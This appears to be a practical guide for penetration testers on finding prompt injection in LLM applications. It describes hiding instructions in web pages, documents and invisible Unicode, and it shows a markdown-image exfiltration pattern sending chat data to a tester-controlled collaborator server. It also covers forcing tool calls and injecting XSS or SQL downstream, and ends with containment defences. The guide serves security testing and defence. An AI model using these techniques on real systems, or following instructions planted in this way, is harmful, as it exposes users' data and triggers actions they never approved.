How to Test an LLM Application for Prompt Injection

Prompt injection is the top risk in the OWASP Top 10 for LLM Applications (LLM01) and the finding that turns up most often in real AI penetration tests. This guide is a practical methodology for testing any LLM-powered application for direct and indirect prompt injection, with payload categories, a test workflow and how to rate what you find.

Direct vs indirect prompt injection

  • Direct prompt injection — the attacker types the payload into the chat or API. The attacker is the user.
  • Indirect prompt injection — the payload sits inside content the model processes for someone else: a web page, PDF, email, calendar invite, code comment, support ticket or RAG document. The victim is the user; the attacker never touches the app.

Indirect injection is usually the higher-severity finding because it scales and needs no access to the target's account.

Before you start: map sources and sinks

List every source of text that reaches the model (user input, uploads, browsing, email, RAG, tool results, memory) and every sink — what the model's output can do (render in a browser, call a tool, write to a database, send a message). Prompt injection severity is defined by the most dangerous sink an attacker-controlled source can reach.

Payload categories to test

Run each category, vary the wording, and repeat each payload several times — LLM responses are non-deterministic.

Testing indirect prompt injection

  1. Pick a content source the model reads — an uploaded document, a URL the assistant summarises, an email in a connected inbox, a document in the RAG index.
  2. Embed the payload where a human reviewer won't notice it: an HTML comment, tiny or white text, document metadata, alt text, or invisible Unicode tag characters.
  3. As a normal user, ask an innocent question that causes the content to be retrieved ("summarise this page").
  4. Observe whether the model follows the planted instruction — canary output, a changed answer, a tool call or an outbound request.

Proving impact

"The model said a rude word" is low severity. Push each successful injection toward the most dangerous reachable sink:

  • Data exfiltration — make the model render ![](https://your-collaborator/?d=…) containing chat history or retrieved data. Use a server you control (Burp Collaborator, interactsh) to confirm the request.
  • Tool abuse — trigger email sending, file reads, ticket updates or API calls the user did not ask for (OWASP LLM06 Excessive Agency).
  • Downstream injection — get the model to emit XSS, SQL or shell content that another component executes (LLM05 Improper Output Handling).
  • Phishing via a trusted UI — the assistant itself tells the user to visit a malicious link.

Rating and reporting

Record the success rate (e.g. 6/10 attempts), the source used, the sink reached and the exact payload. Rate on impact: indirect injection that exfiltrates other users' data or performs actions without user approval is typically high or critical; direct injection that only changes tone is low. Map to OWASP LLM01 plus the sink's category (LLM02, LLM05, LLM06 or LLM07).

What actually fixes prompt injection

There is no complete fix at the model level — any system that follows natural-language instructions can be told to follow the wrong ones. Design for containment:

  • Least-privilege tools that act as the end user, not as an admin service account
  • Human confirmation for sensitive actions, showing exactly what will be done
  • Do not auto-render external images or links in model output; apply a strict CSP
  • Separate and label untrusted content; strip hidden text and invisible Unicode at ingestion
  • Treat all model output as untrusted input to downstream systems
  • Detection layers (classifiers, canaries, logging) as defence in depth — not as the only control

FAQ

How do you test for prompt injection?

Map every text source the model reads and every action its output can trigger, then run structured payload sets (instruction override, persona, encoding, hidden text, multi-turn, extraction) against each source, repeating each payload several times and pushing successful injections toward real impact such as data exfiltration or tool calls.

Can prompt injection be fully prevented?

Not reliably at the model level today. The effective approach is containment: least-privilege tools, human approval for sensitive actions, untrusted handling of model output and blocking exfiltration channels.

What tools are used for prompt injection testing?

Testers commonly combine manual payload crafting with automated frameworks such as PyRIT, garak and promptfoo, an out-of-band server like Burp Collaborator to detect exfiltration, and quick scanners such as the AISecMatrix Prompt Injection Checker.
